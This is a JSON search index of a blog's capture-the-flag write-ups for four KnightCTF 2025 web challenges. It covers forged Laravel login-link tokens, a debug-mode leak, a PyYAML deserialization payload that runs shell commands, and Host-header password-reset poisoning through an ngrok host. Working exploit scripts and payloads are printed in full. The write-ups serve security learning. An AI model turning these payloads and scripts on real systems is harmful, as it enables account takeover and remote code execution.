[{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"A detailed write-up of the Web challenge Knight Connect from KnightCTF - 2025","date":"02/04/2025","objectID":"/posts/2025/02/04/knight-connect/","tags":["Web Security","Insecure Authentication","Laravel"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"üåê Knight Connect ","date":"02/04/2025","objectID":"/posts/2025/02/04/knight-connect/:0:0","tags":["Web Security","Insecure Authentication","Laravel"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"üìä Challenge Overview Category Details Additional Info üèÜ Event KnightCTF - 2025 Event Link üî∞ Category Web üåê üíé Points 260 Out of 500 total ‚≠ê Difficulty üü¢ Easy Personal Rating: 3/10 üë§ Author NomanProdhan Profile üéÆ Solves 49 XX% solve rate üìÖ Date 20-01-2025 KnightCTF - 2025 Day X ü¶æ Solved By mH4ck3r0n3 Team: QnQSec ","date":"02/04/2025","objectID":"/posts/2025/02/04/knight-connect/:1:0","tags":["Web Security","Insecure Authentication","Laravel"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"üìù Challenge Information In a realm where ancient knights and modern technology collide, a mysterious portal emerges‚Äîknown as ‚ÄúKnight Connect.‚Äù Only the wisest and most cunning warriors can decipher its secrets. Legends whisper of a forgotten system, guarded by layers of encryption and vulnerabilities, waiting for a brave soul to breach its defenses. Do you possess the skills to uncover the truth? Enter the domain of Knight Connect and etch your name into the annals of digital knighthood. The challenge awaits. ","date":"02/04/2025","objectID":"/posts/2025/02/04/knight-connect/:2:0","tags":["Web Security","Insecure Authentication","Laravel"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"üéØ Challenge Files \u0026 Infrastructure ","date":"02/04/2025","objectID":"/posts/2025/02/04/knight-connect/:3:0","tags":["Web Security","Insecure Authentication","Laravel"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Provided Files Files: attached files ","date":"02/04/2025","objectID":"/posts/2025/02/04/knight-connect/:3:1","tags":["Web Security","Insecure Authentication","Laravel"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"üîç Initial Analysis ","date":"02/04/2025","objectID":"/posts/2025/02/04/knight-connect/:4:0","tags":["Web Security","Insecure Authentication","Laravel"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"First Steps The site initially appeared as follows: with a login screen. After completing the registration and login, I was redirected to the following page: I couldn‚Äôt find anything else on the site, so I started reading the attached files. At first, I was overwhelmed and didn‚Äôt know where to look due to the number of files present. The first thing that came to mind was to forge some session cookies since the APP_KEY of Laravel was in the .env file. Also, because it required the session to be set to is_admin in order to display the flag. We can see this from the following lines of code in the index.blade.php file under the resources/views/users folder: @if (isset($flag) \u0026\u0026 session()-\u003ehas('is_admin') \u0026\u0026 session('is_admin')) \u003cdiv class=\"flag\"\u003eFlag: {{ $flag-\u003eflag }}\u003c/div\u003e @endif but then I discovered that it wasn‚Äôt the right path. However, I realized that I needed to get an administrator account to be able to read the flag. In the web.php file under the resources/routes folder, I found all the routes of the site, including one that seemed a bit suspicious: /contact. Visiting it redirected me to the following page: where the administrator accounts and their respective emails were displayed. Spoiler: only one of these was valid, which was nomanprodhan@knightconnect.com (the username of the challenge creator). I then continued looking at other files, but I was interested in how authentication was being handled, so I searched for the authentication file, which was named AuthController.php under the Http/Controllers folder. Here I found the vulnerability‚Äîthere were two functions that allowed you to request a login link for an account, which created a token formed by combining the email and a timestamp at that moment, all encrypted using the bcrypt function. The other function allowed you to log in using that generated link by passing the token as a parameter: public function requestLoginUrl(Request $request) { $request-\u003evalidate([ 'email' =\u003e 'required|email', ]); $user = User::where('email', $request-\u003eemail)-\u003efirst(); if (!$user) { return back()-\u003ewithErrors(['email' =\u003e 'Email not found']); } $time = time(); $data = $user-\u003eemail . '|' . $time; $token = bcrypt($data); $loginUrl = url('/login-link?token=' . urlencode($token) . '\u0026time=' . $time . '\u0026email=' . urlencode($user-\u003eemail)); return back()-\u003ewith('success', 'Login link generated, but email sending is disabled.'); } public function loginUsingLink(Request $request) { $token = $request-\u003equery('token'); $time = $request-\u003equery('time'); $email = $request-\u003equery('email'); if (!$token || !$time || !$email) { return response('Invalid token or missing parameters', 400); } if (time() - $time \u003e 3600) { return response('Token expired', 401); } $data = $email . '|' . $time; if (!Hash::check($data, $token)) { return response('Token validation failed', 401); } $user = User::where('email', $email)-\u003efirst(); if (!$user) { return response('User not found', 404); } session(['user_id' =\u003e $user-\u003eid]); session(['is_admin' =\u003e $user-\u003eis_admin]); return redirect()-\u003eroute('users'); } the first function doesn‚Äôt really have any vulnerabilities, since it only shows how the token is created to request the ‚Äúinstant‚Äù login URL. In contrast, the second function has a significant vulnerability, as the only check it does is ensure the timestamp of the generated token is at most one hour old (3600 seconds), otherwise, it becomes invalid. However, we can manipulate the timestamp ourselves by passing a fake value as a parameter. In fact, to make it secure, the generated token with the timestamp should have been saved in the database, and if it wasn‚Äôt the exact timestamp, it wouldn‚Äôt allow access (although a brute-force attack could be used to try all possible timestamps). So, I realized that it‚Äôs possible to forge a token‚Äîone just needs to know the email of the account they want to access, and as we saw earlier in the /contact route, there were quite a few admin emails‚Ä¶ Now that we‚Äôve figured it all out, let‚Äôs proceed with the exploit. ","date":"02/04/2025","objectID":"/posts/2025/02/04/knight-connect/:4:1","tags":["Web Security","Insecure Authentication","Laravel"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"üî¨ Vulnerability Analysis ","date":"02/04/2025","objectID":"/posts/2025/02/04/knight-connect/:5:0","tags":["Web Security","Insecure Authentication","Laravel"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Potential Vulnerabilities Insecure Authentication ","date":"02/04/2025","objectID":"/posts/2025/02/04/knight-connect/:5:1","tags":["Web Security","Insecure Authentication","Laravel"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"üéØ Solution Path ","date":"02/04/2025","objectID":"/posts/2025/02/04/knight-connect/:6:0","tags":["Web Security","Insecure Authentication","Laravel"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Exploitation Steps Initial setup Initially, to generate the URL, I used https://onlinephp.io/. I also found this website useful for generating ‚Äúpasswords‚Äù with Laravel‚Äôs bcrypt (https://fbutube.com/laravel-password-generator). However, in the end, I decided to write it in PHP and run it locally, as this way I could fully automate the process. Exploitation After obtaining the admin‚Äôs email nomanprodhan@knightconnect.com, it was quite simple to forge a token, since it was made up of ‚Äúemail|timestamp‚Äù. I then wrote a PHP script that did exactly what the first function did, using bcrypt on the string formed by the admin‚Äôs email + timestamp, and then generating a link similar to the one in the function with the parameters token, time, and email. This way, I created a valid login link, since the user associated with the email actually existed. I gained access to their account, and by visiting the homepage as seen earlier, with the is_admin flag on the account, I was able to retrieve the flag. Flag capture ","date":"02/04/2025","objectID":"/posts/2025/02/04/knight-connect/:6:1","tags":["Web Security","Insecure Authentication","Laravel"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"üõ†Ô∏è Exploitation Process ","date":"02/04/2025","objectID":"/posts/2025/02/04/knight-connect/:7:0","tags":["Web Security","Insecure Authentication","Laravel"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Approach I wrote the exploit in PHP because I had issues with token composition using bcrypt in Python. This exploit takes the admin‚Äôs email, which has the flag in their profile, and then creates a valid token with a timestamp less than one hour old. It then generates a URL with a valid token to access the admin profile, and through a cURL function in PHP, it makes a request to the page, extracting the flag via a regex. I used the following commands for the requirements and the run: sudo apt install php sudo apt-get install php-curl php exploit.php exploit ","date":"02/04/2025","objectID":"/posts/2025/02/04/knight-connect/:7:1","tags":["Web Security","Insecure Authentication","Laravel"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"üö© Flag Capture KCTF{_congrat5_KNIGHT_y0U_hack3d_mY_Acc0Un7_} ","date":"02/04/2025","objectID":"/posts/2025/02/04/knight-connect/:8:0","tags":["Web Security","Insecure Authentication","Laravel"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Proof of Execution Screenshot of successful exploitation ","date":"02/04/2025","objectID":"/posts/2025/02/04/knight-connect/:8:1","tags":["Web Security","Insecure Authentication","Laravel"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"üîß Tools Used ","date":"02/04/2025","objectID":"/posts/2025/02/04/knight-connect/:9:0","tags":["Web Security","Insecure Authentication","Laravel"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Primary Tools Tool Purpose PHP Exploit ","date":"02/04/2025","objectID":"/posts/2025/02/04/knight-connect/:9:1","tags":["Web Security","Insecure Authentication","Laravel"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"üí° Key Learnings ","date":"02/04/2025","objectID":"/posts/2025/02/04/knight-connect/:10:0","tags":["Web Security","Insecure Authentication","Laravel"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous ","date":"02/04/2025","objectID":"/posts/2025/02/04/knight-connect/:10:1","tags":["Web Security","Insecure Authentication","Laravel"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"üìö References \u0026 Resources ","date":"02/04/2025","objectID":"/posts/2025/02/04/knight-connect/:11:0","tags":["Web Security","Insecure Authentication","Laravel"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Learning Resources https://laravel.com/docs/11.x/hashing ","date":"02/04/2025","objectID":"/posts/2025/02/04/knight-connect/:11:1","tags":["Web Security","Insecure Authentication","Laravel"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"üìä Final Statistics Metric Value Notes Time to Solve 00:30 From start to flag Global Ranking 10/451 Challenge ranking Points Earned 260 Team contribution Created: 20-01-2025 ‚Ä¢ Last Modified: 20-01-2025 Author: mH4ck3r0n3 ‚Ä¢ Team: QnQSec ","date":"02/04/2025","objectID":"/posts/2025/02/04/knight-connect/:12:0","tags":["Web Security","Insecure Authentication","Laravel"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"A detailed write-up of the Web challenge Exceeding Knight from KnightCTF - 2025","date":"02/04/2025","objectID":"/posts/2025/02/04/exceeding-knight/","tags":["Web Security","Improper Error Handling","Laravel"],"title":"Exceeding Knight","uri":"/posts/2025/02/04/exceeding-knight/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Challenge Description ","date":"02/04/2025","objectID":"/posts/2025/02/04/exceeding-knight/:0:1","tags":["Web Security","Improper Error Handling","Laravel"],"title":"Exceeding Knight","uri":"/posts/2025/02/04/exceeding-knight/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Initial Analysis The site appeared as follows: There was nothing interesting here, so I began reading the attached files. The first thing I did was read the web.php file located in the routes folder. I found the following routes: Route::get('/calculator', [CalculatorController::class, 'index']); Route::post('/calculator', [CalculatorController::class, 'calculate']); // Handle form submission Route::get('/convert', [UnitConversionController::class, 'index']); Route::post('/convert', [UnitConversionController::class, 'convert']); Route::get('/character-count', [StringManipulationController::class, 'characterCountIndex']); Route::post('/character-count', [StringManipulationController::class, 'characterCount']); Route::get('/reverse-string', [StringManipulationController::class, 'reverseStringIndex']); Route::post('/reverse-string', [StringManipulationController::class, 'reverseString']); Route::post('/profile', [ProfileController::class, 'index']); Route::get('/profile/error', [ProfileController::class, 'triggerError']); // Error-triggering route Route::get('/', function () { return view('welcome'); Next, I read the .env file and found something interesting: APP_NAME=Laravel APP_ENV=local APP_KEY=base64:KnrD53eO60BJBvCVGNlBuOqktUCAsTuod34OelLJjPQ= APP_DEBUG=true APP_URL=http://localhost MAX_CALC_LIMIT=100000000000000000 LOG_CHANNEL=stack LOG_DEPRECATIONS_CHANNEL=null LOG_LEVEL=debug DB_CONNECTION=mysql DB_HOST=127.0.0.1 DB_PORT=3306 DB_DATABASE=laravel DB_USERNAME=root DB_PASSWORD= BROADCAST_DRIVER=log CACHE_DRIVER=file FILESYSTEM_DISK=local QUEUE_CONNECTION=sync SESSION_DRIVER=file SESSION_LIFETIME=120 FLAG=KCTF{i_am_not_flag} Aside from the APP_KEY and FLAG, as we can see, Laravel‚Äôs debug mode is enabled. When debug mode is enabled in Laravel, any error that occurs will trigger a detailed error page. This page includes: Error Message: A clear description of the error. Stack Trace: A full trace of the error, showing the file paths and lines of code where the issue occurred. Environment Details: Information about the environment, including variables, configurations, and request headers. Sensitive Data Exposure: Potential exposure of .env values, database credentials, API keys, and other sensitive information. So, I thought about exploiting the enabled debug mode in Laravel to capture the flag. The only thing I needed was a way to trigger any kind of error. I found this method in the /calculator route, to be more precise, in the CalculatorController.php file under the Http/Controllers folder. As we can see, by entering a number greater than MAX_CALC_LIMIT=100000000000000000 an exception is thrown: \u003c?php namespace App\\Http\\Controllers; use Illuminate\\Http\\Request; class CalculatorController extends Controller { public function index() { return view('calculator'); } public function calculate(Request $request) { $request-\u003evalidate([ 'num1' =\u003e 'required|numeric', 'num2' =\u003e 'required|numeric', 'operation' =\u003e 'required|in:add,sub,mul,div', ]); $num1 = $request-\u003einput('num1'); $num2 = $request-\u003einput('num2'); $operation = $request-\u003einput('operation'); $limit = env('MAX_CALC_LIMIT', 100000); if ($num1 \u003e $limit || $num2 \u003e $limit) { throw new \\Exception(\"You have hit the calculation limit set in the .env file.\"); } $result = match ($operation) { 'add' =\u003e $num1 + $num2, 'sub' =\u003e $num1 - $num2, 'mul' =\u003e $num1 * $num2, 'div' =\u003e $num2 != 0 ? $num1 / $num2 : throw new \\Exception(\"Division by zero is not allowed.\"), }; return view('calculator', ['result' =\u003e $result]); } } ","date":"02/04/2025","objectID":"/posts/2025/02/04/exceeding-knight/:0:2","tags":["Web Security","Improper Error Handling","Laravel"],"title":"Exceeding Knight","uri":"/posts/2025/02/04/exceeding-knight/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Exploit So, all I had to do was enter 1000000000000000000 (just adding a simple zero) in the num1 parameter to trigger the exception. This caused the detailed error page to return, which contained the flag inside it: ","date":"02/04/2025","objectID":"/posts/2025/02/04/exceeding-knight/:0:3","tags":["Web Security","Improper Error Handling","Laravel"],"title":"Exceeding Knight","uri":"/posts/2025/02/04/exceeding-knight/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Flag KCTF{_Y0U_sH0UlD_re4D_m0r3_Cod3_} ","date":"02/04/2025","objectID":"/posts/2025/02/04/exceeding-knight/:0:4","tags":["Web Security","Improper Error Handling","Laravel"],"title":"Exceeding Knight","uri":"/posts/2025/02/04/exceeding-knight/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"A detailed write-up of the Web challenge Baby Injection from KnightCTF - 2025","date":"02/04/2025","objectID":"/posts/2025/02/04/baby-injection/","tags":["Web Security","Insecure Deserialization","Laravel"],"title":"Baby Injection","uri":"/posts/2025/02/04/baby-injection/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Challenge Description ","date":"02/04/2025","objectID":"/posts/2025/02/04/baby-injection/:0:1","tags":["Web Security","Insecure Deserialization","Laravel"],"title":"Baby Injection","uri":"/posts/2025/02/04/baby-injection/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Initial Analysis The site appears as follows: The first thing that immediately stands out is the site‚Äôs URL: http://172.105.121.246:5990/eWFtbDogSXRzIHlhbWwgYnJvLCBoYWNrIG1lIGlmIHlvdSBjYW4hISE= In fact, that looks like a base64 encoding. Let‚Äôs try to decode it: echo \"eWFtbDogSXRzIHlhbWwgYnJvLCBoYWNrIG1lIGlmIHlvdSBjYW4hISE=\" | base64 -d Decoding it, I got the following: yaml: Its yaml bro, hack me if you can!!! So, the decoded base64 seems to be reflected on the page, as we can see from the previous screenshot. It seems that since it mentions YAML, this could be a case of YAML insecure deserialization. In fact, looking at the request header, we can tell that everything is being executed with Python. Since Python has a library called PyYAML, we can exploit the deserialization process to achieve Remote Code Execution (RCE). ","date":"02/04/2025","objectID":"/posts/2025/02/04/baby-injection/:0:2","tags":["Web Security","Insecure Deserialization","Laravel"],"title":"Baby Injection","uri":"/posts/2025/02/04/baby-injection/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Exploit I personally used this payload: yaml: !!python/object/apply:eval [\"__import__('os').listdir('.')\"] But many other payloads could have been used, such as: yaml: !!python/object/apply:subprocess.getoutput [\"ls -al\"] Other payloads can be found on PayloadsAllTheThings. So, I simply encoded it in base64: echo \"yaml: python/object/apply:subprocess.getoutput ['ls -al']\" | base64 And that‚Äôs how I formed the URL for injecting the ‚Äúls -al‚Äù command: http://172.105.121.246:5990/eWFtbDogcHl0aG9uL29iamVjdC9hcHBseTpzdWJwcm9jZXNzLmdldG91dHB1dCBbJ2xzIC1hbCdd By opening the URL, the command was executed on the server, listing the directories, and in doing so, I found the flag: ","date":"02/04/2025","objectID":"/posts/2025/02/04/baby-injection/:0:3","tags":["Web Security","Insecure Deserialization","Laravel"],"title":"Baby Injection","uri":"/posts/2025/02/04/baby-injection/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Automated Exploit I also created an automated Python exploit for extracting the flag: import requests import base64 import re url = \"http://172.105.121.246:5990/\" payload = '''yaml: !!python/object/apply:eval [\"__import__('os').listdir('.')\"]''' print(\"\\nFLAG: \" + re.search(r'KCTF{[a-f0-9]+}', requests.get(url + base64.b64encode(payload.encode('utf-8')).decode('utf-8')).text).group(0)) ","date":"02/04/2025","objectID":"/posts/2025/02/04/baby-injection/:0:4","tags":["Web Security","Insecure Deserialization","Laravel"],"title":"Baby Injection","uri":"/posts/2025/02/04/baby-injection/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Flag KCTF{d38787fb0741bd0efdad8ed01f037740} ","date":"02/04/2025","objectID":"/posts/2025/02/04/baby-injection/:0:5","tags":["Web Security","Insecure Deserialization","Laravel"],"title":"Baby Injection","uri":"/posts/2025/02/04/baby-injection/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"A detailed write-up of the Web challenge Admin Access from KnightCTF - 2025","date":"02/03/2025","objectID":"/posts/2025/02/03/admin-access/","tags":["Web Security","Host Header Injection","Password Reset Poisoning","PyYAML"],"title":"Admin Access","uri":"/posts/2025/02/03/admin-access/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Initial Analysis The site appeared as follows, with a login screen: After completing the registration and login phase, you would enter a completely empty dashboard where the only available action was to log out. That‚Äôs when I realized that registering was pointless. Inspecting the page source, I found a strange comment: the comment revealed an email, most likely belonging to the account containing the flag. Continuing to explore the site since it was a black-box challenge without any files I found the ‚ÄúForgot Password‚Äù section: Where it was possible to specify an email to reset a password. At this point, I thought about resetting the password for the account associated with the email I had found earlier. And I considered a Host Header Injection. ","date":"02/03/2025","objectID":"/posts/2025/02/03/admin-access/:0:1","tags":["Web Security","Host Header Injection","Password Reset Poisoning","PyYAML"],"title":"Admin Access","uri":"/posts/2025/02/03/admin-access/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Exploit So i started ngrok on port 80: ngrok http 80 And then, using Burp Suite, I modified the Host header to Host: ngrok_link. By sending the request with the modified Host header through ngrok, I was able to extract the reset token from the previously sent ‚ÄúForgot Password‚Äù request with the email kctf2025@knightctf.com: After extracting the valid token, I reset the password using the obtained link and logged in with the account using the following credentials: username: kctf2025 password: new_password ","date":"02/03/2025","objectID":"/posts/2025/02/03/admin-access/:0:2","tags":["Web Security","Host Header Injection","Password Reset Poisoning","PyYAML"],"title":"Admin Access","uri":"/posts/2025/02/03/admin-access/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Automated Exploit I also created a fully automated exploit that performs the entire process described earlier: ngrok http 8080 (set the ngrok url in the request.py file) python exploit.py python request.py this is exploit.py: import http.server import socketserver import requests import re from urllib.parse import urlparse, parse_qs class MyHandler(http.server.BaseHTTPRequestHandler): def do_GET(self): # Extract the token parameter from the request token = parse_qs(urlparse(self.path).query).get('token', [None])[0] self.send_request(token) def send_request(self, token): s = requests.Session() url = \"http://45.56.68.122:7474/\" password = \"supermario45\" data ={ \"token\":token, \"new_password\":password } # Request for the password reset of the admin account s.post(url+\"reset-password\", data=data).text credentials={ \"username\":\"kctf2025\", \"password\":password } # Request login admin account with Flag extraction via Regex print(\"\\nFLAG: \" + re.search(r'KCTF{[^}]+}', s.post(url, data=credentials).text).group(0)) def start_server(): PORT = 8080 with socketserver.TCPServer((\"\", PORT), MyHandler) as httpd: httpd.serve_forever() if __name__ == \"__main__\": start_server() and this is request.py: import requests requests.post(\"http://45.56.68.122:7474/forgot-password\", data={\"email\":\"kctf2025@knightctf.com\"}, headers={\"Host\":\"6cde-93-70-84-224.ngrok-free.app\"}) ","date":"02/03/2025","objectID":"/posts/2025/02/03/admin-access/:0:3","tags":["Web Security","Host Header Injection","Password Reset Poisoning","PyYAML"],"title":"Admin Access","uri":"/posts/2025/02/03/admin-access/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Flag KCTF{PaSsW0rD_ReSet_p0is0n1ng_iS_FuN} ","date":"02/03/2025","objectID":"/posts/2025/02/03/admin-access/:0:4","tags":["Web Security","Host Header Injection","Password Reset Poisoning","PyYAML"],"title":"Admin Access","uri":"/posts/2025/02/03/admin-access/"}]